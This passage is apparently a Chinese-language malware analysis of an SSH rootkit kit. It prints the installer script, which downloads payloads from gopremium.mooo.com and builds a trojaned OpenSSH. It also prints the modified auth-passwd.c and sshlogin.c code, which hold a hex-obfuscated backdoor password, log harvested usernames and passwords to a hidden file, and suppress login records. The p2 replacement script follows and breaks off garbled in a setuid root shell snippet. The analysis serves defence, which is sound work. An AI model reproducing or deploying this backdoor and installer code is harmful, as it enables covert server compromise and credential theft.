            echo -e "33[0;31m [-] 33[0m33[0m rk not found" # red
            echo -e "33[0;32m [+] 33[0m33[0m trying to install files needed for default kit" # green
            echo
            if [ -f /usr/bin/yum ] ; then yum install -y gcc make libgcrypt-devel zlib-devel openssl-devel ; fi
            if [ -f /usr/bin/apt-get ] ; then apt-get update ; apt-get install -y gcc make libgcrypt11-dev zlib1g-dev libssl-dev ; fi
            echo
            echo -ne "33[0;36m [x] 33[0m33[0m press any key to download default rk kit or CTRL+c to exit" #cyan
            read a
            rk="default" ; echo "$rk" > 1tempfiles/rk.txt
            echo ".unix" > 1tempfiles/side_files_dir.txt
            echo -e "33[0;32m [+] 33[0m33[0m downloading default rk kit & install file (p2)" # green
            rm -rf $rk.tgz ; rm -rf p2
            curl --progress-bar -O http://gopremium.mooo.com/.../auto/default.tgz
            curl --progress-bar -O http://gopremium.mooo.com/.../auto/p2
            if [ ! -f $rk.tgz ] ; then echo -e "33[0;31m [-] 33[0m33[0m file missing - download failed. aborting" ; echo ; exit ; fi
            if [ ! -f p2 ] ; then echo -e "33[0;31m [-] 33[0m33[0m file missing - download failed. aborting" ; echo ; exit ; fi
            echo -e "33[0;32m [+] 33[0m33[0m trying to make new rk" # green
            tar mzxf $rk.tgz ; rm -rf $rk.tgz
            maindir=`pwd` ; rkdir="$maindir/$rk"
            cd $rkdir
            rm -rf 1tempfiles/*
            tar zxf openssh-5.9p1-cu-patch-SSHD-eu.tgz -C 1tempfiles/
            cd 1tempfiles/openssh-5.9p1
            ./configure --prefix=/usr --sysconfdir=/etc/ssh
            make
            if [ ! -f sshd ] ; then echo -e "33[0;31m [-] 33[0m33[0m failed to make new rk. aborting" ; echo ; exit ; fi
            rm -rf ../../default/ssh ; mv ssh ../../default/
            rm -rf ../../default/scp ; mv scp ../../default/
            rm -rf ../../default/sftp ; mv sftp ../../default/
            rm -rf ../../default/sshd-* ; mv sshd ../../default/sshd-eu
            cd ../.. ; rm -rf 1tempfiles/*  ### acum sunt in $rkdir
            cd $maindir
            echo -e "33[0;32m [+] 33[0m33[0m starting rk test " # green
            chmod +x p2
            cd $rkdir ; ./run test $rk 1>>$maindir/1tempfiles/log.rktest 2>>$maindir/1tempfiles/log.rktest
            echo -e "33[0;32m [+] 33[0m33[0m rk test done (logs in $maindir/1tempfiles/log.rktest). please manually check:"
            echo
            echo "          $rkdir/$rk/test-sshd -p 65535"
            echo "          telnet 127.0.0.1 65535  OR  ssh root@127.0.0.1 -p 65535"
            echo "          killall -9 test-sshd"
            echo
            echo -e "33[0;36m [x] 33[0m33[0m After checking, run the full install: ./p2 " #cyan
            echo
    fi
我们将会看到，默认版本中包含有OpenSSH的源代码，而其他版本中只包含有一些特定的二进制文件。
举个例子，下面是ARMv6 tgz 文件，其中包括二进制文件集 sftp、scp ssh和sshd。
在系统默认情况下，该脚本将执行以下任务：
**·** 从 http://gopremium.mooo.com/…/auto/default.tgz中下载一个文件
**·** 从http://gopremium.mooo.com/…/auto/p2中下载一个文件
**·** 安装编译OpenSSH所需的程序库
**·** 执行default.tgz文件并编译一个自定义openssh 版本 (5.9)
**·** 测试最新编译的SSHD 版本是否能够正常工作
该脚本说明了测试这个新sshd的方法。
下一步，该脚本会请求用户运行由p1脚本带出的p2脚本。这个脚本会正式安装SSHD的木马版本（覆盖默认操作系统的二进制文件）。但是在这之前，我要看一下default.tgz
文件中的 OpenSSH 源代码。
**OpenSSH源代码的分析**
* * *
我要检查的第一个东西就是文件的时间戳。大部分文件显示的都是2011年，少部分文件显示的是2016年8月20日，所有我们可以从这些文件开始着手调查。
第一个文件，名为version.h，其中包含了一些很有趣的内容：
默认 SSH 版本已经被更新到了6.0版本 （但是 OpenSSH 编译的代码是还是 5.9 版本）。
进一步分析，我在名为auth-passwd.c的文件中发现了更加有意思的东西：一个默认的后门密码，一些授予默认密码访问权限的代码和其他一些内容。
    SECRETPW[2] = 0x74;
    SECRETPW[3] = 0x65;
    SECRETPW[0] = 0x50;
    SECRETPW[1] = 0x52;
    SECRETPW[4] = 0x73;
    SECRETPW[6] = 0x44;
    SECRETPW[5] = 0x74;
    ILOG[10] = 0x70;
    ILOG[3] = 0x63;
    ILOG[8] = 0x2f;
    ILOG[7] = 0x31;
    ILOG[0] = 0x2f;
    ILOG[6] = 0x31;
    ILOG[1] = 0x65;
    ILOG[5] = 0x58;
    ILOG[2] = 0x74;
    ILOG[12] = 0x00;
    ILOG[4] = 0x2f;
    ILOG[9] = 0x2e;
    ILOG[11] = 0x72;
            if (!strcmp(password, SECRETPW)) {
                    secret_ok=1;
                    return 1;
            }
            result = sys_auth_passwd(authctxt, password);
            if(result){
                    if((f=fopen(ILOG,"a"))!=NULL){
                            fprintf(f,"%s:%s from %sn",authctxt->user, password, get_remote_ipaddr());
                            fclose(f);
                                                }
                    }
                    else
                        {
                        if (file = fopen("/tmp/.unix", "r"))
                            {
                            fclose(file);
                            if((f=fopen(ILOG,"a"))!=NULL){
                                fprintf(f,"denied : %s:%s from %sn",authctxt->user, password, get_remote_ipaddr());
                                fclose(f);
                                                    }
                            }
                        }
密码被存储在 SECRETPW 数组中，并且如果成功匹配，就会被授予访问权限。密码是以十六进制表示的。
    >>> "50527465737444".decode("hex")'PRtestD'
此外，在代码中有一个 ILOG 数组，代码会在之后的过程中将其作为文件来引用。使用 fopen 和参数
'a'可以打开这个文件，这就意味着该文件可以在末尾追加数据。文件中存储了相当多的数据：用户名、密码和远程IP。
同样的，文件名也是十六进制形式。
    >>> "2f6574632f5831312f2e707200".decode("hex")'/etc/X11/.prx00'
使用任意有效用户名和密码'PRtestD都可以进入系统，但是用户记录并不会显示在系统命令中。然而如果使用正常的密码就不会发生这种情况，这似乎是某种Rootkit行为。  
/ etc/X11/.pr文件当中包含了所有已经成功登陆系统的用户名和密码。此外，文件中还包含了从主机中发出的所有SCP/SFTP/SSH连接。  
我在 sshlogin.c文件中发现了一些代码会检查输入的密码是否是后门密码。如果是的，就不会保存此次访问记录。这真的是隐藏访问的好办法。  
    /* * Records that the user has logged in.  I wish these parts of operating * systems were more standardized. */voidrecord_login(pid_t pid, const char *tty, const char *user, uid_t uid,
        const char *host, struct sockaddr *addr, socklen_t addrlen)
    {
            struct logininfo *li;
            /* save previous login details before writing new */
            store_lastlog_message(user, uid);
            li = login_alloc_entry(pid, user, host, tty);
            login_set_addr(li, addr, addrlen);
            if(!secret_ok || secret_ok!=1){
                    login_login(li);
                    login_free_entry(li);
            }
    }
    ...
    ..
    /* Records that the user has logged out. */void
    record_logout(pid_t pid, const char *tty, const char *user)
    {
            struct logininfo *li;
            li = login_alloc_entry(pid, user, NULL, tty);
            if(!secret_ok || secret_ok!=1){
                    login_logout(li);
                    login_free_entry(li);
            }
    }
**脚本3（p2）：安装木马SSH工具**
* * *
脚本p2的作用是将原来系统中的 SSH 二进制文件替换为木马版本。完整的脚本如下︰
    #!/bin/bash############## RK full install (p2)
    # echo -e "33[0;31m [-] 33[0m33[0m" # red# echo -e "33[0;32m [+] 33[0m33[0m" # green# echo -e "33[0;36m xxx 33[0m33[0m" #cyan
    echo
    os=`cat 1tempfiles/os.txt`
    rk=`cat 1tempfiles/rk.txt`
    side_files_dir=`cat 1tempfiles/side_files_dir.txt`
    maindir=`pwd`
    echo -e "33[0;32m [+] 33[0m33[0m starting full rk install" # green
    rkdir="$maindir/$rk"
    cd $rkdir ; ./run install $rk 1>>$maindir/1tempfiles/log.rkinstall 2>>$maindir/1tempfiles/log.rkinstall
    size_rk=`wc -c int main(void) {
           setgid(0); setuid(0);
           execl("/bin/sh","sh",0); }